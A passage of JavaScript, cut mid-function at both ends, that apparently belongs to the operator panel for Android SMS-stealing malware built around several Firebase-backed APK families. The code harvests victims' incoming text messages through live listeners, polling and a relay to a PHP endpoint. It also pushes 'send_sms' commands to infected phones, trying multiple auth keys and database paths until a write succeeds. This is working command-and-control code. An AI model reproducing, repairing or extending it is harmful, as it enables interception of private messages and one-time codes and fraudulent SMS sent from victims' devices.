  try{
    var ref=inst.db.ref(path);
    try{ref=ref.limitToLast(500);}catch(e2){}
    var valHandler=function(snap){
      if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
      if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
      applyFn(parseSmsRaw(typeof snap.val==='function'?snap.val():snap));
    };
    ref.on('value',valHandler);
    listeners.refs.push({ref:ref,h:valHandler,type:'value'});
    var addHandler=function(snap){
      if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
      if(!snap)return;
      var val=typeof snap.val==='function'?snap.val():snap;
      var one=normalizeSms(Object.assign({},val||{},{id:snap.key}),snap.key);
      if(one)mergeSmsIntoDevice(devId,[one]);
    };
    ref.on('child_added',addHandler);
    listeners.refs.push({ref:ref,h:addHandler,type:'child_added'});
  }catch(e){}
}
function attachSmsLiveListeners(inst,d,devId,seq,listeners,applyFn){
  if(!inst||!inst.db||typeof applyFn!=='function')return;
  var paths=uniqPaths(getPrioritySmsPaths(d,inst).concat(['messages/'+d.rawId,'user_sms/'+d.rawId,'sms_backup/'+d.rawId])).slice(0,3);
  paths.forEach(function(path){
    if(!path)return;
    try{
      var baseRef=inst.db.ref(path);
      var qRef=baseRef;
      try{qRef=baseRef.limitToLast(200);}catch(e2){}
      var ingestSnap=function(snap,instant){
        if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
        if(!snap)return;
        var key=typeof snap.key==='string'?snap.key:'';
        var val=typeof snap.val==='function'?snap.val():snap;
        if(!val||typeof val!=='object')return;
        if(instant){
          var one=normalizeSms(Object.assign({},val,{id:val.id||key}),key||val.id);
          if(one)mergeSmsIntoDevice(devId,[one]);
          return;
        }
        applyFn(parseSmsRaw(val));
      };
      qRef.once('value',function(snap){ingestSnap(snap,false);});
      var addedHandler=function(snap){ingestSnap(snap,true);};
      qRef.on('child_added',addedHandler);
      listeners.refs.push({ref:qRef,h:addedHandler,type:'child_added'});
      var changedHandler=function(snap){ingestSnap(snap,true);};
      qRef.on('child_changed',changedHandler);
      listeners.refs.push({ref:qRef,h:changedHandler,type:'child_changed'});
      var valHandler=function(snap){
        if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
        if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
        applyFn(parseSmsRaw(typeof snap.val==='function'?snap.val():snap));
      };
      qRef.on('value',valHandler);
      listeners.refs.push({ref:qRef,h:valHandler,type:'value'});
    }catch(e){}
  });
}

/** Schema-aware fast paths — Rabel panels (rto9) store SMS in user_sms/{deviceId} */
function smsPrimaryPaths(d,inst){
  var id=d.rawId, schema=(inst&&inst.schema)||'rabel', paths=[], bases=getSmsDeviceBases(d,inst), pref=(inst&&inst.config&&inst.config.preferredDeviceNode)||'';
  if(!id)return paths;
  if(isRabelPanel(inst)||schema==='rabel'||pref==='user_list'||pref==='user_data'){
    paths.push('messages/'+id);
    paths.push('user_sms/'+id);
    paths.push('sms_backup/'+id);
    paths.push('sms/'+id);
    bases.forEach(function(n){
      if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
      ['all_sms','new_sms','sms','messages'].forEach(function(sfx){
        var p=n+'/'+id+'/'+sfx;
        if(paths.indexOf(p)<0)paths.push(p);
      });
    });
    return uniqPaths(paths);
  }
  PANEL_SMS_GLOBAL_NODES.forEach(function(g){paths.push(g+'/'+id);});
  if(schema==='shootii'){
    ['Verify_Device'].concat(bases).forEach(function(n){
      if(!n)return;
      PANEL_SMS_SUFFIXES.forEach(function(sfx){
        var p=n+'/'+id+'/'+sfx;
        if(paths.indexOf(p)<0)paths.push(p);
      });
    });
    return uniqPaths(paths);
  }
  if(schema==='spinplay'){
    ['devices','devices_status'].concat(bases).forEach(function(n){
      if(!n)return;
      ['all_sms','new_sms','sms','messages'].forEach(function(sfx){
        var p=n+'/'+id+'/'+sfx;
        if(paths.indexOf(p)<0)paths.push(p);
      });
    });
    paths.push('messages/'+id);
    return uniqPaths(paths);
  }
  paths.push('messages/'+id);
  bases.forEach(function(n){
    if(!n)return;
    ['all_sms','new_sms','sms','messages','user_sms'].forEach(function(sfx){
      var p=n+'/'+id+'/'+sfx;
      if(paths.indexOf(p)<0)paths.push(p);
    });
  });
  return uniqPaths(paths);
}

/** All known SMS read paths from panel APK reverse + rebel.py */
function smsPathsForDevice(d,inst){
  var id=d.rawId, paths=[], bases=getSmsDeviceBases(d,inst||getFbInstance(d.fbId));
  if(!id)return paths;
  paths.push('user_sms/'+id);
  paths.push('sms_backup/'+id);
  paths.push('messages/'+id);
  paths.push('sms/'+id);
  PANEL_SMS_GLOBAL_NODES.forEach(function(g){if(paths.indexOf(g+'/'+id)<0)paths.push(g+'/'+id);});
  bases.forEach(function(n){
    if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
    PANEL_SMS_SUFFIXES.forEach(function(sfx){paths.push(n+'/'+id+'/'+sfx);});
    paths.push(n+'/'+id+'/webhookEvent/receivedSms');
  });
  return uniqPaths(paths.concat(buildDynamicSmsPaths(d,inst||getFbInstance(d.fbId))).filter(function(p){return !isJunkSmsPath(p);}));
}

function mergeSmsLists(){
  var merged=[], seen={}, i, j, list, s, key;
  for(i=0;i<arguments.length;i++){
    list=arguments[i]||[];
    for(j=0;j<list.length;j++){
      s=list[j];if(!s)continue;
      key=(s.address||'?')+'|'+(s.ts||0)+'|'+(s.body||'').slice(0,80);
      if(seen[key])continue;
      seen[key]=1;merged.push(s);
    }
  }
  merged.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
  return merged;
}

function parseSmsRaw(data){
  if(!data||isFirebaseErr(data))return [];
  return smsAsList(data).map(normalizeSms).filter(Boolean);
}

function fetchSmsPathsParallel(inst,paths){
  if(!inst||!paths||!paths.length)return Promise.resolve([]);
  return Promise.all(paths.map(function(p){
    return restJsonInst(inst,p).then(function(data){
      if(!data||isFirebaseErr(data))return [];
      return smsAsList(data).map(normalizeSms).filter(Boolean);
    }).catch(function(){return[];});
  })).then(function(results){
    var args=[mergeSmsLists];
    results.forEach(function(r){args.push(r);});
    return mergeSmsLists.apply(null,args);
  });
}
function fetchSmsFast(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  if(shouldUseApkSmsPath(inst,d)){
    var apkPath=getApkSmsPath(d);
    return fetchSmsPathsParallel(inst,[apkPath]).then(function(first){
      if(first.length)return first;
      return fetchSmsPathsParallel(inst,['user_sms/'+d.rawId,'sms_backup/'+d.rawId]);
    });
  }
  var paths=uniqPaths(getPrioritySmsPaths(d,inst).concat(buildUniversalSmsPaths(d,inst).slice(0,6))).slice(0,12);
  if(!paths.length)paths=['messages/'+d.rawId];
  var wave1=paths.slice(0,4);
  var wave2=paths.slice(wave1.length);
  return fetchSmsPathsParallel(inst,wave1).then(function(first){
    if(!wave2.length)return first;
    return fetchSmsPathsParallel(inst,wave2).then(function(rest){
      return mergeSmsLists(first,rest);
    });
  });
}

function fetchSmsFromPathsDirect(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  var priority=getPrioritySmsPaths(d,inst);
  var extra=buildUniversalSmsPaths(d,inst).filter(function(p){return priority.indexOf(p)<0&&!isJunkSmsPath(p);});
  var fetchList=uniqPaths(priority.concat(extra)).slice(0,16);
  return fetchSmsPathsParallel(inst,fetchList);
}
function fetchSmsViaPhp(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  var hdr={'Content-Type':'application/json'};
  return fetch(FETCH_SMS_URL,{
    method:'POST',headers:hdr,
    body:JSON.stringify({
      device_id:d.rawId,
      database_url:inst.restUrl,
      auth_key:getFbAuthKey(inst),
      schema:inst.schema||'rabel',
      device_node:getClientWritePath(d,inst),
      composite_id:d.id
    })
  }).then(function(r){return r.json();}).then(function(j){
    if(!j||!j.ok||!Array.isArray(j.messages))return [];
    return j.messages.map(normalizeSms).filter(Boolean);
  }).catch(function(){return[];});
}
function fetchSmsFromPaths(inst,d){
  if(!inst||!d)return Promise.resolve([]);
  var fast=fetchSmsFast(inst,d);
  var full=fetchSmsFromPathsDirect(inst,d);
  var php=fetchSmsViaPhp(inst,d);
  return fast.then(function(list){
    if(list.length){
      full.then(function(merged){if(merged.length)setDeviceSms(d.id,merged);});
      php.then(function(fb){if(fb.length)setDeviceSms(d.id,fb);});
      return list;
    }
    return full.then(function(merged){
      if(merged.length)return merged;
      return php;
    });
  });
}

function loadSmsForDevice(force){
  var d=getSelDev();if(!d)return;
  var devId=d.id;
  var smsEmpty=document.getElementById('smsEmpty');
  if(smsEmpty)smsEmpty.classList.add('hidden');
  var cached=deviceSmsCache[devId];
  if(cached&&cached.list&&cached.list.length){
    window_allSms=cached.list;
    window_sms=cached.list.slice(0,80);
    _smsLoading=false;
    renderSms();
    renderDeviceSmsList();
  }else{
    showSmsForSelectedDevice();
    _smsLoading=true;
    renderSms();
  }

  var cacheFresh=cached&&cached.at&&(Date.now()-cached.at<90000);
  if(!force&&cacheFresh&&activeListeners[devId]&&activeListeners[devId].devId===devId){
    return;
  }

  if(!force&&activeListeners[devId]&&activeListeners[devId].devId===devId){
    if(_smsLoading){
      var inst0=getFbInstance(d.fbId);
      if(inst0)fetchSmsFast(inst0,d).then(function(list){
        if(list&&list.length){_smsLoading=false;setDeviceSms(devId,list);}
      });
    }
    return;
  }

  var seq=++_smsLoadSeq;
  clearSmsListeners();
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase project not found',false);_smsLoading=false;return;}

  var apkSms=shouldUseApkSmsPath(inst,d);
  var loadTimer=setTimeout(function(){
    if(seq!==_smsLoadSeq||selDev!==devId)return;
    _smsLoading=false;
    if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)setDeviceSms(devId,[]);
    else renderSms();
  },apkSms?4000:10000);

  function applySmsList(list){
    if(seq!==_smsLoadSeq||selDev!==devId)return;
    clearTimeout(loadTimer);
    _smsLoading=false;
    if(list&&list.length)setDeviceSms(devId,list);
    else if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)setDeviceSms(devId,[]);
  }

  fetchSmsFast(inst,d).then(applySmsList);

  setTimeout(function(){
    if(seq!==_smsLoadSeq||selDev!==devId)return;
    fetchSmsFromPathsDirect(inst,d).then(function(full){
      if(seq!==_smsLoadSeq||selDev!==devId||!full||!full.length)return;
      mergeSmsIntoDevice(devId,full);
      _smsLoading=false;
    });
    fetchSmsViaPhp(inst,d).then(function(fb){
      if(seq!==_smsLoadSeq||selDev!==devId||!fb||!fb.length)return;
      mergeSmsIntoDevice(devId,fb);
      _smsLoading=false;
    });
  },apkSms?80:250);

  var listeners={refs:[],devId:devId,seq:seq,loadTimer:loadTimer,live:!!inst.db,timers:[]};
  if(apkSms){
    attachApkSmsLiveListener(inst,d,devId,seq,listeners,applySmsList);
  }else{
    attachSmsLiveListeners(inst,d,devId,seq,listeners,applySmsList);
  }

  var pollMs=inst.db?3000:SMS_POLL_BG_MS;
  var timer=setInterval(function(){
    if(seq!==_smsLoadSeq||selDev!==devId||_panelPaused)return;
    fetchSmsFast(inst,d).then(function(list){
      if(seq!==_smsLoadSeq||selDev!==devId||!list||!list.length)return;
      mergeSmsIntoDevice(devId,list);
    });
    fetchSmsViaPhp(inst,d).then(function(list){
      if(seq!==_smsLoadSeq||selDev!==devId||!list||!list.length)return;
      mergeSmsIntoDevice(devId,list);
    });
  },pollMs);
  listeners.timer=timer;
  listeners.timers=[timer];

  activeListeners[devId]=listeners;
}
function smsLooksLikeMessage(m){
  if(!m||typeof m!=='object')return false;
  if(isSmsCommandRecord(m)||isOutboundSmsCommand(m))return false;
  return !!String(m.body||m.message||m.text||m.content||m.msg||'').trim();
}
function isOutboundSmsCommand(m){
  if(!m||typeof m!=='object')return false;
  if(m.body&&m.sender)return false;
  if(m.body&&m.address)return false;
  if(m.sender||m.originatingAddress)return false;
  if(m.to&&m.status&&(m.message||m.msg)&&!m.body)return true;
  if(m.to&&(m.message||m.msg)&&!m.sender&&!m.body&&!m.date&&!m.timestamp)return true;
  return false;
}
function smsAsList(raw){
  if(!raw)return[];
  if(isSmsCommandRecord(raw)||isOutboundSmsCommand(raw))return[];
  if(Array.isArray(raw)){
    var out=[], i, v;
    for(i=0;i<raw.length;i++){
      v=raw[i];
      if(!v||typeof v!=='object')continue;
      if(smsLooksLikeMessage(v))out.push(v);
      else out=out.concat(smsAsList(v));
    }
    return out;
  }
  if(typeof raw!=='object')return[];
  var wrapKeys=['messages','sms','data','items','list'], w;
  for(w=0;w<wrapKeys.length;w++){
    if(raw[wrapKeys[w]]&&typeof raw[wrapKeys[w]]==='object')return smsAsList(raw[wrapKeys[w]]);
  }
  return Object.keys(raw).map(function(k){
    var v=raw[k];
    if(!v||typeof v!=='object')return null;
    if(smsLooksLikeMessage(v))return v.id?v:Object.assign({},v,{id:k});
    return null;
  }).filter(Boolean).concat(
    Object.keys(raw).reduce(function(acc,k){
      var v=raw[k];
      if(v&&typeof v==='object'&&!smsLooksLikeMessage(v))acc=acc.concat(smsAsList(v));
      return acc;
    },[])
  );
}
// ---- FIX: SMS timestamp extraction and sorting ----
function smsToMs(v){
  if(v==null||v==='')return 0;
  if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;
  if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
  if(typeof v==='string'){var t=Date.parse(v);if(!isNaN(t))return t;var d2=parseDdMmYyyy(v);if(d2)return d2;}
  return 0;
}
function parseDdMmYyyy(s){
  if(!s||typeof s!=='string')return 0;
  var m=String(s).trim().match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?$/i);
  if(!m)return 0;
  var dd=+m[1],MM=+m[2],yyyy=+m[3],hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
  if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
  var ms=new Date(yyyy,MM-1,dd,hh,mi,ss).getTime();
  return isNaN(ms)?0:ms;
}
function smsMsgTime(m){
  if(!m)return 0;
  var keys=['date','timestamp','dateTime','datetime','time','received_at','sent_at','created_at','receivedAt','sentAt','sms_time','msg_time','last_modified','received_time','sent_time','id'];
  for(var i=0;i<keys.length;i++){var ms=smsToMs(m[keys[i]]);if(ms)return ms;}
  var sk=smsToMs(m._sortKey);if(sk)return sk;
  return smsToMs(m.date_readable);
}
function smsDisplayTime(m){
  if(!m)return '—';
  var keys=['dateTime','date_readable','date_time','time','date','received_at','sent_at'];
  var i,v;
  for(i=0;i<keys.length;i++){
    v=m[keys[i]];
    if(v==null||v==='')continue;
    if(typeof v==='string'&&String(v).trim())return String(v).trim();
  }
  return '—';
}
function normalizeSms(m,keyId){
  if(!m||typeof m!=='object')return null;
  if(isSmsCommandRecord(m)||isOutboundSmsCommand(m))return null;
  var body=String(m.body||m.message||m.text||m.content||m.msg||'').trim();
  if(!body)return null;
  if(!m.body&&m.message&&m.to&&m.status&&!m.sender)return null;
  var ts=smsMsgTime(m);
  var display=smsDisplayTime(m);
  if(display==='—'&&ts){
    var dt=new Date(ts);
    if(!isNaN(dt.getTime())){
      var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
      var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'pm':'am';
      h=h%12||12;
      display=dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
    }
  }
  return{
    id:m.id||keyId||m._key||'',
    address:m.address||m.sender||m.from||m.number||m.originatingAddress||'?',
    body:body,
    message:body,
    sender:m.sender||m.address||m.from||'',
    date_readable:display,
    dateTime:m.dateTime||m.date_readable||m.date||'',
    type:String(m.type||m.direction||m.sms_type||'inbox').toLowerCase(),
    ts:ts
  };
}
function renderSmsFromData(data){
  var list=smsAsList(data).map(normalizeSms).filter(Boolean);
  // Sort by timestamp descending (latest first)
  list.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
  window_sms=list.slice(0,60);renderSms();
}
function renderSms(){
  renderSmsModal();
}
function copySmsByIndex(idx){
  var d=getSelDev();if(!d)return;
  var cached=deviceSmsCache[d.id];
  var list=(cached&&cached.list&&cached.list.length)?cached.list:window_sms;
  var s=list&&list[idx];if(!s||!s.body)return;
  var text=String(s.body);
  function markCopied(btn){
    if(!btn)return;
    btn.textContent='✓';btn.classList.add('copied');
    toast('SMS copied',true);
    setTimeout(function(){btn.textContent='📋';btn.classList.remove('copied');},1500);
  }
  var btn=document.querySelectorAll('.sms-copy-btn')[idx];
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(text).then(function(){markCopied(btn);}).catch(function(){
      var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();
      try{document.execCommand('copy');markCopied(btn);}catch(e){toast('Copy failed',false);}
      document.body.removeChild(ta);
    });
  }else{
    var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();
    try{document.execCommand('copy');markCopied(btn);}catch(e){toast('Copy failed',false);}
    document.body.removeChild(ta);
  }
}

// ---- FIX: SIM Selection ----
var _sendSimSlot=1;
function selectSim(slot,btn){
  _sendSimSlot=slot;
  document.querySelectorAll('.sim-chip').forEach(function(el){el.classList.remove('active');});
  if(btn)btn.classList.add('active');
}

// ---- Send SMS — instant Firebase direct + REST fallback ----
function isNyaApkFirebase(inst){
  if(!inst)return false;
  if(inst.config&&String(inst.config.id||'').indexOf('nya_')===0)return true;
  if(inst.config&&inst.config.deviceNode==='clients')return true;
  if(inst.config&&inst.config.preferredDeviceNode==='clients')return true;
  if(inst.schema==='rabel'&&inst.rootKeys&&inst.rootKeys.indexOf('clients')>=0)return true;
  return false;
}
function formatApkSmsTo(raw){
  var clean=String(raw||'').replace(/\D/g,'');
  if(clean.length===10)return '91'+clean;
  if(clean.length===12&&clean.indexOf('91')===0)return clean;
  if(clean.length>10)return '91'+clean.slice(-10);
  return clean;
}
function buildRabelSendPayload(sim,to,message,d){
  var fromSim=rabelFromSimForSend(sim,d,to);
  var ts=Date.now();
  return{from:fromSim,to:formatApkSmsTo(to),message:message,isSended:false,timestamp:ts,id:'sms_'+ts};
}
function buildRabelSendPayload10(sim,to,message,d){
  var fromSim=rabelFromSimForSend(sim,d,to);
  var ten=normalizePhoneDigits(formatApkSmsTo(to))||normalizePhone(to);
  var ts=Date.now();
  return{from:fromSim,to:ten||formatApkSmsTo(to),message:message,isSended:false,timestamp:ts,id:'sms_'+ts};
}
function needsDualSmsSend(inst,d){
  if(!inst)return false;
  if(isNyaApkFirebase(inst)||shouldUseApkSmsPath(inst,d))return true;
  if(isNyaApkClientRecord(getRawDev(d.id)))return true;
  if(isRabelPanel(inst)||inst.schema==='rabel')return true;
  if(isRtoStyleUrl(inst.restUrl))return true;
  return false;
}
function buildNyaApkCommandPatch(deviceId,sim,to,message){
  var to91=formatApkSmsTo(to);
  var slot=Math.max(0,(sim||1)-1);
  return{
    cmd:'send_sms',command:'send message',messageText:message,msg:message,
    phoneNumber:to91,phone:to91,number:to91,to:to91,
    targetDeviceId:deviceId,simSlot:String(slot),sim:slot,
    sendSms:{message:message,status:'pending',to:to91},
    sms:{message:message,status:'pending',to:to91},
    type:'sms',timestamp:Date.now(),webhookEvent:'send_sms'
  };
}
function buildRto9SendPayload(deviceId,sim,to,message){
  return buildNyaApkCommandPatch(deviceId,sim,to,message);
}
function dedupeSendAttempts(list){
  var seen={}, out=[];
  (list||[]).forEach(function(a){
    if(!a||!a.path)return;
    var key=String(a.method||'PUT').toUpperCase()+'|'+a.path;
    if(seen[key])return;
    seen[key]=1;
    out.push(a);
  });
  return out;
}
function pushSmsPatchAttempts(out,node,id,patch){
  if(!node||!id)return;
  out.push({path:node+'/'+id,payload:patch,method:'PATCH'});
}
function pushSmsWebhookAttempt(out,node,id,payload){
  if(!node||!id)return;
  out.push({path:node+'/'+id+'/webhookEvent/sendSms',payload:payload,method:'PUT'});
}
function getSendAttempts(inst,d,to,message,sim){
  var id=d.rawId,out=[],raw=getRawDev(d.id);
  var profileNode=getClientWritePath(d,inst)||'clients';
  var patch=buildNyaApkCommandPatch(id,sim,to,message);
  var rabel91=buildRabelSendPayload(sim,to,message,d);
  var rabel10=buildRabelSendPayload10(sim,to,message,d);
  var manualCmd={to:formatApkSmsTo(to),message:message,sim:Math.max(0,(sim||1)-1),timestamp:Date.now()};
  function pushManual(node){
    if(!node||!id)return;
    out.push({path:node+'/'+id+'/manual_commands/send_sms',payload:manualCmd,method:'PUT'});
    out.push({path:node+'/'+id+'/commands/send_sms',payload:patch,method:'PUT'});
  }
  if(needsDualSmsSend(inst,d)){
    if(profileNode!=='clients')pushSmsPatchAttempts(out,profileNode,id,patch);
    pushSmsPatchAttempts(out,'clients',id,patch);
    pushSmsWebhookAttempt(out,'clients',id,rabel91);
    pushManual('clients');
    if(profileNode!=='clients'){
      pushSmsWebhookAttempt(out,profileNode,id,rabel91);
      pushManual(profileNode);
      if(String(rabel10.to)!==String(rabel91.to))pushSmsWebhookAttempt(out,profileNode,id,rabel10);
    }
    if(isRtoStyleUrl(inst.restUrl)){
      out.push({path:id,payload:patch,method:'PATCH'});
      out.push({path:id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
      out.push({path:id+'/manual_commands/send_sms',payload:manualCmd,method:'PUT'});
    }
    return dedupeSendAttempts(out);
  }
  if(inst.schema==='spinplay'){
    uniqPaths([profileNode,'devices','clients','Verify_Device']).forEach(function(n){
      if(!n)return;
      out.push({path:n+'/'+id+'/manual_commands/send_sms',payload:{to:formatApkSmsTo(to),message:message,sim:Math.max(0,(sim||1)-1)},method:'PUT'});
    });
    out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
    return out;
  }
  out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
  out.push({path:profileNode+'/'+id+'/webhookEvent/sendSms',payload:rabel91,method:'PUT'});
  return dedupeSendAttempts(out);
}
function restWriteViaNative(url,method,payload){
  if(!window.REBEL_NATIVE_APP||!window.RebelAndroid||typeof RebelAndroid.panelFetch!=='function')return null;
  try{
    var res=JSON.parse(RebelAndroid.panelFetch(JSON.stringify({
      url:url,method:method||'PUT',body:JSON.stringify(payload||{})
    })));
    if(!res||res.error||(res.ok===false&&!res.messageText&&!res.command))return null;
    return res;
  }catch(e){return null;}
}
function appendOptimisticSentSms(devId,to,msg){
  if(!devId||!msg)return;
  var entry={
    address:formatApkSmsTo(to)||String(to||'?'),
    body:String(msg),
    type:'sent',
    date_readable:formatApkDateFromMs(Date.now())||'Just now',
    ts:Date.now(),
    _optimistic:1
  };
  mergeSmsIntoDevice(devId,[entry]);
}
function verifySmsQueuedOnDevice(inst,devId,message){
  if(!inst||!devId||!message)return Promise.resolve(false);
  var needle=String(message).trim().slice(0,24);
  if(!needle)return Promise.resolve(false);
  return restJsonInst(inst,'clients/'+devId).then(function(node){
    if(node&&typeof node==='object'){
      if(node.messageText&&String(node.messageText).indexOf(needle)>=0)return true;
      if(node.msg&&String(node.msg).indexOf(needle)>=0)return true;
      if(node.sendSms&&node.sendSms.message&&String(node.sendSms.message).indexOf(needle)>=0)return true;
      if(node.cmd==='send_sms'&&node.messageText)return true;
    }
    return restJsonInst(inst,'clients/'+devId+'/sendSms').then(function(ss){
      if(ss&&ss.message&&String(ss.message).indexOf(needle)>=0)return true;
      return restJsonInst(inst,'clients/'+devId+'/messageText').then(function(mt){
        return !!(mt&&String(mt).indexOf(needle)>=0);
      });
    });
  }).catch(function(){return false;});
}
function promiseAny(promises){
  return new Promise(function(resolve,reject){
    if(!promises||!promises.length)return reject(new Error('No send path'));
    var fails=0, errors=[];
    promises.forEach(function(p){
      Promise.resolve(p).then(resolve).catch(function(e){
        errors.push(e&&e.message?e.message:String(e||'fail'));
        if(++fails>=promises.length)reject(new Error(errors.filter(Boolean).join(' · ')||'All send paths failed'));
      });
    });
  });
}
function sendSmsViaRestOne(inst,a){
  if(!inst||!a)return Promise.reject(new Error('No attempt'));
  var auths=getFbAuthCandidates(inst), j=0;
  function tryAuth(){
    if(j>=auths.length)return Promise.reject(new Error('REST failed'));
    var auth=auths[j++];
    var url=buildRestUrl(inst,a.path,auth);
    var native=restWriteViaNative(url,a.method||'PUT',a.payload);
    if(native)return Promise.resolve({ok:true,path:a.path,via:'native-rest',method:a.method||'PUT'});
    return fetch(url,{
      method:a.method||'PUT',headers:{'Content-Type':'application/json'},
      body:JSON.stringify(a.payload),cache:'no-store'
    }).then(function(r){
      if(r.ok)return{ok:true,path:a.path,via:'rest',method:a.method||'PUT'};
      return tryAuth();
    }).catch(function(){return tryAuth();});
  }
  return tryAuth();
}
function sendSmsViaRestDual(inst,attempts){
  if(!inst||!attempts||!attempts.length)return Promise.reject(new Error('No REST paths'));
  return Promise.all(attempts.map(function(a){
    return sendSmsViaRestOne(inst,a).then(function(r){
      return{ok:true,path:a.path,method:a.method||'PUT',r:r};
    }).catch(function(e){
      return{ok:false,path:a.path,method:a.method||'PUT',error:e&&e.message?e.message:String(e||'fail')};
    });
  })).then(function(results){
    var patchOk=results.some(function(x){
      if(!x.ok)return false;
      var p=String(x.path||'');
      return String(x.method||'').toUpperCase()==='PATCH'||p.indexOf('manual_commands/send_sms')>=0||p.indexOf('commands/send_sms')>=0;
    });
    var webhookOk=results.some(function(x){return x.ok&&String(x.path||'').indexOf('webhookEvent/sendSms')>=0;});
    if(patchOk||webhookOk){
      var paths=results.filter(function(x){return x.ok;}).map(function(x){return x.path+'('+x.method+')';}).join(', ');
      return{ok:true,via:'rest',path:paths,patchOk:patchOk,webhookOk:webhookOk};
    }
    throw new Error('SMS Firebase par queue nahi hua — device online hona chahiye');
  });
}
function sendSmsDirectFirebaseDual(inst,attempts){
  if(!inst||!inst.db||!attempts||!attempts.length)return Promise.reject(new Error('No SDK paths'));
  return Promise.all(attempts.map(function(a){
    return sendSmsDirectFirebaseOne(inst,a).then(function(r){
      return{ok:true,path:a.path,method:a.method||'PUT',r:r};
    }).catch(function(e){
      return{ok:false,path:a.path,method:a.method||'PUT',error:e&&e.message?e.message:String(e||'fail')};
    });
  })).then(function(results){
    var patchOk=results.some(function(x){
      if(!x.ok)return false;
      var p=String(x.path||'');
      return String(x.method||'').toUpperCase()==='PATCH'||p.indexOf('manual_commands/send_sms')>=0||p.indexOf('commands/send_sms')>=0;
    });
    var webhookOk=results.some(function(x){return x.ok&&String(x.path||'').indexOf('webhookEvent/sendSms')>=0;});
    if(patchOk||webhookOk){
      var paths=results.filter(function(x){return x.ok;}).map(function(x){return x.path;}).join(', ');
      return{ok:true,via:'firebase',path:paths,patchOk:patchOk,webhookOk:webhookOk};
    }
    throw new Error('SDK send failed');
  });
}
function sendSmsViaRestSequential(inst,attempts){
  if(!inst||!attempts||!attempts.length)return Promise.reject(new Error('No REST paths'));
  var i=0;
  function next(){
    if(i>=attempts.length)return Promise.reject(new Error('All REST paths failed'));
    return sendSmsViaRestOne(inst,attempts[i++]).catch(next);
  }
  return next();
}
function sendSmsDirectFirebaseOne(inst,a){
  if(!inst||!inst.db||!a)return Promise.reject(new Error('No SDK path'));
  var ref=inst.db.ref(a.path);
  var method=String(a.method||'PUT').toUpperCase();
  if(method==='PATCH')return ref.update(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase',method:'PATCH'};});
  return ref.set(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase',method:'PUT'};});
}
function sendSmsDirectFirebaseSequential(inst,attempts){
  if(!inst||!inst.db||!attempts||!attempts.length)return Promise.reject(new Error('No SDK paths'));
  var i=0;
  function next(){
    if(i>=attempts.length)return Promise.reject(new Error('All SDK paths failed'));
    return sendSmsDirectFirebaseOne(inst,attempts[i++]).catch(next);
  }
  return next();
}
function sendSmsViaRest(inst,attempts){
  return sendSmsViaRestSequential(inst,attempts);
}
function sendSmsDirectFirebase(inst,attempts){
  return sendSmsDirectFirebaseSequential(inst,attempts);
}
function normalizePhone(raw){
  var clean=String(raw||'').replace(/\D/g,'');
  if(clean.length===10)return clean;
  if(clean.length>10&&clean.indexOf('91')===0)return clean.slice(-10);
  return clean;
}
function sendSmsFetch(body){
  var hdr={'Content-Type':'application/json'};
  var apk=rebelApkHeaders();
  for(var k in apk)hdr[k]=apk[k];
  return fetch(SEND_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
    .then(function(r){
      return r.json().then(function(j){return{httpOk:r.ok,data:j,status:r.status};})
        .catch(function(){return{httpOk:false,data:{ok:false,error:'Bad response from server'},status:r.status};});
    })
    .catch(function(e){return{httpOk:false,data:{ok:false,error:String(e&&e.message?e.message:'Network error')},status:0};});
}
function sendSms(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var toEl=document.getElementById('sendTo');
  var msgEl=document.getElementById('sendMsg');
  var statusEl=document.getElementById('sendStatus');
  if(!toEl||!msgEl){sendDeviceSms(_sendSimSlot||1);return;}
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return;}
  var to=normalizePhone(toEl.value.trim());
  var msg=msgEl.value.trim();
  if(!to||to.length<10){toast('Enter valid 10-digit number',false);return;}
  if(!msg){toast('Enter message',false);return;}
  if(_sendInFlight){toast('Sending...',true);return;}
  _sendInFlight=true;
  if(statusEl)statusEl.textContent='Sending…';
  sendSmsInstant(to,msg,_sendSimSlot,function(ok,data){
    _sendInFlight=false;
    if(ok){
      msgEl.value='';
      if(statusEl)statusEl.textContent='✅ '+(data&&data.message||'Sent instantly');
      toast('SMS sent!',true);
    }else{
